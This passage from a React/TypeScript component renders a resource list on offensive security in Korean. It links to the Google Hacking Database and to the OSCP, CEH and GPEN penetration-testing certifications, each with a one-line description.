                description: 'OSINT 도구 분류 및 링크 모음 (Interactive Tree)',
              },
              {
                title: 'Google Hacking Database (GHDB)',
                url: 'https://www.exploit-db.com/google-hacking-database',
                description: 'Google Dorking 쿼리 데이터베이스 (6,000+ 검색어)',
              },
            ],
          },
          {
            title: '🎓 인증 & 자격증',
            icon: 'docs' as const,
            color: 'border-blue-500',
            items: [
              {
                title: 'OSCP (Offensive Security Certified Professional)',
                url: 'https://www.offsec.com/courses/pen-200/',
                description: '실무 침투 테스트 자격증 ($1,649, 24시간 실습 시험)',
              },
              {
                title: 'CEH (Certified Ethical Hacker)',
                url: 'https://www.eccouncil.org/programs/certified-ethical-hacker-ceh/',
                description: 'EC-Council 윤리적 해커 자격증',
              },
              {
                title: 'GPEN (GIAC Penetration Tester)',
                url: 'https://www.giac.org/certifications/penetration-tester-gpen/',
                description: 'SANS Institute 침투 테스트 자격증',
              },
            ],
          },
        ]}
      />
    </div>
  );
}
